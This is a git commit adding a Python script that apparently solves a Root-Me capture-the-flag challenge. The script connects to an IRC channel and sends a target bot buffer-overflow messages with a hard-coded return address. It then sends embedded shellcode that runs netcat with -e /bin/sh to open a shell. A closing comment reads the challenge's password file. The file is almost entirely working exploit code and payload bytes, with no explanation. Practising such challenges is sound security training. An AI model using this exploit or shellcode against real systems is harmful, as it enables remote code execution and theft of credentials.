2dfa6c2e695ade1173bd49f4a31ed4ee65d35255
Elise LIVET <elivet@e3r5p7.42.fr>
2016-02-03 15:34:28 +0100

    ex12 ex13

---
+++ ex12/script.py
@@ -0,0 +1,55 @@
+#!/usr/bin/env python
+
+import socket
+import struct
+import telnetlib
+import time
+#import irclib
+
+HOST = "irc.root-me.org"
+PORT = 6667
+NICK = "JMB"
+CHANNEL = "#root-me_challenge"
+TARGET = "Pown3dBot"
+#TARGET = "JMB2"
+SHELL="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46"
+
+def sendMessage(target , msg):
+  s.send("PRIVMSG "+ target +" :"+ msg +"\r\n")
+
+#connect
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+#config
+print "======> NICK " + NICK + "\r\n"
+s.send("NICK %s\r\n" % NICK)
+print "======> USER "+ NICK +" "+ NICK +" "+ NICK +" :JMB2\r\n"
+s.send("USER "+ NICK +" "+ NICK +" "+ NICK +" :JMB2\r\n")
+time.sleep(1)
+print "======> JOIN "+ CHANNEL +"\r\n"
+s.send("JOIN "+ CHANNEL +"\r\n")
+
+time.sleep(4)
+print s.recv(1024)
+
+#exploit
+p1 = "!" + "J" * 139 +  "\x99\xf7\xff\xbf" + "PRIVMSG\0"
+print "======> PRIVMSG "+ TARGET + p1
+sendMessage(TARGET, p1);
+time.sleep(2)
+print s.recv(1024)
+
+p2 = "!" + "M" * 103 + "PRIVMSG\0"
+print "======> PRIVMSG "+ TARGET + p2
+sendMessage(TARGET, p2);
+time.sleep(2)
+print s.recv(1024)
+
+print "======> PRIVMSG + SHELL"
+sendMessage(TARGET, SHELL);
+time.sleep(2)
+print s.recv(1024)
+
+
+# cd challenge/app-systeme/ch31/; cat .passwd;
